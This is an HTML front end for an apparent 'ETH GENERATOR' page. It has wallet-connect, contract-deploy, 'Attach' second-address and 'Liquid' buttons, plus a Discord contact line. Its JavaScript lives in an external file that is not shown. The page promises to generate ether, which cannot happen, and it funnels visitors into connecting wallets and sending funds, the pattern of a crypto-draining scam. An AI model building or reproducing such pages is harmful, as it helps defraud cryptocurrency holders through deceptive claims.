<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ETH GENERATOR</title>
  <link rel="stylesheet" href="styles.css"> <!-- Link to external CSS -->
</head>
<body>
  <!-- Loading Screen -->
  <div id="loadingScreen">
    <div class="loading-circle">
      <div class="loading-text">Loading...</div>
    </div>
  </div>

  <!-- Main Content -->
  <br>
  <BR>
  <br>
  <b><p>ETH GANARATOR</p>
  <section id="mainContent">
    <header></header>
    <button id="connectButton" class="styled-button">Connect</button>
    <table id="checkAdressBalanceButton" style="display: none">
      <tr>
        <td>My Contract</td>
        <td><button id="regular" class="styled-button">Deploy</button></td>
        <td><p id="result"><code>No Contract</code></p></td>
      </tr>
      <tr>
        <td>Wallet Balance</td>
        <td>
          <p id="walletBalance">0 ETH</p>
        </td>
      </tr>
      <tr>
        <td>My Second Address</td>
        <td>
          <input type="text" id="typeAdress" name="adress_auth" placeholder="Input second address ETH-0x" autocomplete="off" size="20" class="styled-input" disabled />
        </td>
        <td>
          <button id="sendEtherButton" class="styled-button" disabled>Attach</button>
        </td>
        <td><div id="statusMessage"></div></td>
      </tr>
      <tr>
        <td>My Status</td>
        <td>
          <center>
            <button disabled id="checkBalanceButton" class="styled-button">Liquid</button>
          </center>
        </td>
        <td><p id="balanceDisplay" style="display: none"></p>Confirm the liquidity</td>
      </tr>
    </table>
    <p>DISCORD :- KING DEVIL.XYZ</p>
  </section>

  <script src="script.js"></script> <!-- Link to external JavaScript -->
</body>
</html>
